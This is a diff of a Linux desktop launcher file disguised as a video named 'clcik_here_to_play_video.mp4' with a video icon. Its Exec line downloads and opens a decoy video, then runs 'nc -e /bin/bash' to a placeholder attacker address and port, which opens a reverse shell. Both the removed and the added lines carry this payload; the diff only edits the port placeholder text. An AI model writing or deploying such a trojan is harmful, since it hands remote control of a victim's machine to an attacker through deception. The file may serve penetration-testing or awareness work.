@@ -1,7 +1,7 @@
 [Desktop Entry]
 Encoding=UTF-8
 Name=clcik_here_to_play_video.mp4
-Exec=sh -c '/usr/bin/wget "http://{private_ip_address}/real_video.mp4" -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; nc -e /bin/bash {private_ip_address} {port number}'
+Exec=sh -c '/usr/bin/wget "http://{private_ip_address}/real_video.mp4" -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; nc -e /bin/bash {private_ip_address} {port number where netcat is running}'
 Terminal=false
 Type=Application
 Icon=video-x-generic
